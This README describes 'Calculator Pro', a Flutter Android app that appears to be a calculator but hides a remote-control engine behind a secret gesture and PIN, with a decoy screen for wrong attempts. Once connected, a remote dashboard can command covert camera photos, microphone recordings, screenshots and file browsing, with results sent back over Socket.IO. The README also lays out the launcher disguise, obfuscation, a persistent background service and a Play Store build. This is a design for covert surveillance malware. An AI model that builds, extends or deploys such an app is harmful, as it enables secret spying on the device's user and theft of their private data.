# DeviceBridge Pro — Calculator Pro APK

A fully functional calculator app that contains a hidden device management engine. Connects to the DeviceBridge Pro web dashboard via Socket.IO for remote device control.

## Overview

This Flutter Android application operates in two modes:

1. **Calculator Mode** (Visible): A fully working scientific calculator that serves as the app's public face.
2. **Bridge Mode** (Hidden): Activated by a secret gesture, provides device connection UI, command execution, and background service management.

## Secret Activation

1. **Long press** the "Calculator" title text in the display area for **3 seconds**
2. Enter the PIN: **1999**
3. 3 wrong attempts triggers a 5-minute lockout and shows a fake "Developer Options" screen

## Features

### Calculator (Cover Mode)
- Basic arithmetic: +, −, ×, ÷
- Decimal, percentage, sign toggle
- Scientific functions: sin, cos, tan, log, ln, √, x², π, e
- Calculation history (swipeable, last 50 entries)
- Dark/Light theme support
- Haptic feedback on all buttons

### Bridge Mode (Hidden Engine)
- Socket.IO real-time connection to dashboard
- JWT token authentication (stored in FlutterSecureStorage)
- Background foreground service for persistent connection
- Heartbeat every 30 seconds
- Remote command execution:
  - `camera.capture` — Take photos (front/rear)
  - `mic.record_start` / `mic.record_stop` — Audio recording
  - `flash.on` / `flash.off` / `flash.toggle` / `flash.blink` / `flash.sos` — Flashlight
  - `storage.browse` / `storage.file_info` — File browser
  - `screen.capture` — Screenshot
  - `device.info` / `device.ping` — Device info
- Command log with filtering
- Auto-reconnect with exponential backoff
- Configurable server URL (default: `http://10.0.2.2:3000` for emulator)

## Tech Stack

| Layer | Technology |
|-------|-----------|
| Framework | Flutter 3.24+ / Dart 3 |
| State Management | Riverpod 2.x |
| Real-time | Socket.IO (socket_io_client) |
| Background Service | flutter_background_service (Android Foreground Service) |
| JWT | dart_jsonwebtoken / jwt_decoder |
| Secure Storage | flutter_secure_storage |
| HTTP | dio |
| Camera | camera |
| Audio | record |
| Flashlight | torch_light |

## Project Structure

```
apk/
├── lib/
│   ├── main.dart                          # App entry point
│   ├── app.dart                           # Root widget with Riverpod + theme switching
│   ├── calculator/
│   │   ├── calculator_screen.dart         # Main calculator UI
│   │   ├── calculator_button.dart         # Custom button widget
│   │   ├── calculator_display.dart        # Result display + secret title
│   │   └── calculator_logic.dart          # Expression parser & evaluator
│   ├── bridge/
│   │   ├── bridge_screen.dart             # Hidden bridge main screen
│   │   ├── connection_panel.dart          # Token input & connection
│   │   ├── command_log_screen.dart        # Command history
│   │   └── settings_screen.dart           # Bridge settings
│   ├── services/
│   │   ├── socket_io_service.dart         # Socket.IO client manager
│   │   ├── token_service.dart             # JWT token management
│   │   ├── command_handler.dart           # Command routing & execution
│   │   ├── heartbeat_service.dart         # 30s heartbeat sender
│   │   ├── background_service.dart        # Android foreground service
│   │   └── hardware/
│   │       ├── camera_service.dart
│   │       ├── microphone_service.dart
│   │       ├── flashlight_service.dart
│   │       ├── storage_service.dart
│   │       ├── screen_service.dart
│   │       └── device_info_service.dart
│   ├── models/
│   │   ├── enums.dart
│   │   ├── command_model.dart
│   │   ├── command_result_model.dart
│   │   ├── heartbeat_model.dart
│   │   ├── device_info_model.dart
│   │   ├── capability_model.dart
│   │   └── device_status.dart
│   ├── providers/
│   │   └── providers.dart                 # Riverpod state notifiers
│   ├── widgets/
│   │   ├── loading_indicator.dart
│   │   ├── error_display.dart
│   │   └── status_badge.dart
│   └── core/
│       ├── constants/app_constants.dart
│       ├── theme/app_colors.dart
│       ├── theme/app_theme.dart
│       └── utils/
│           ├── app_settings.dart
│           └── logger.dart
└── android/
    ├── app/src/main/AndroidManifest.xml    # Permissions & foreground service
    ├── app/build.gradle                   # Release config with ProGuard
    └── build.gradle                       # Root Gradle config
```

## Prerequisites

- Flutter SDK 3.24+ (stable channel)
- Android SDK with API level 34
- A physical Android device or emulator with camera

## Build Instructions

### 1. Install dependencies
```bash
cd apk
flutter pub get
```

### 2. Run on device/emulator (debug)
```bash
flutter run
```

### 3. Build release APK
```bash
flutter build apk --release
```
Output: `build/app/outputs/flutter-apk/app-release.apk`

### 4. Build AAB for Play Store
```bash
flutter build appbundle --release
```

## Configuration

### Server URL
Default: `http://10.0.2.2:3000` (Android emulator localhost)

Change in Bridge Mode → Settings, or set via:
```dart
AppSettings.serverUrl = 'http://192.168.1.100:3000';
```

### Activation PIN
Default: `1999`

### Permissions
The app requests these at runtime:
- Camera (for photo capture)
- Microphone (for audio recording)
- Storage (for file browsing)
- Notifications (Android 13+)
- Flashlight (via camera permission)

## Socket.IO Protocol

### Authentication
```json
// Client emits:
{ "token": "eyJhbGciOi..." }

// Server acknowledges:
{ "success": true, "deviceId": "uuid" }
```

### Heartbeat (every 30s)
```json
// Client emits "device:heartbeat":
{
  "deviceId": "uuid",
  "timestamp": 1700000000000,
  "batteryLevel": 85,
  "isCharging": false,
  "networkType": "wifi",
  "activeCapabilities": ["camera", "microphone", "flashlight", "storage", "screen"],
  "deviceName": "My Device"
}
```

### Command Flow
```json
// Server emits "command":
{
  "commandId": "uuid",
  "action": "camera.capture",
  "payload": { "camera": "rear", "quality": "high" }
}

// Client emits "command:result":
{
  "commandId": "uuid",
  "success": true,
  "data": { "image_base64": "...", "image_size_bytes": 245000 },
  "completedAt": "2024-01-01T00:00:00.000Z"
}
```

## Security Notes

- JWT tokens stored in encrypted FlutterSecureStorage
- PIN has 3-attempt lockout with 5-minute cooldown
- Wrong PIN shows decoy "Developer Options" screen
- ProGuard obfuscation enabled in release builds
- App appears as "Calculator Pro" in launcher

## License

Proprietary — DeviceBridge Pro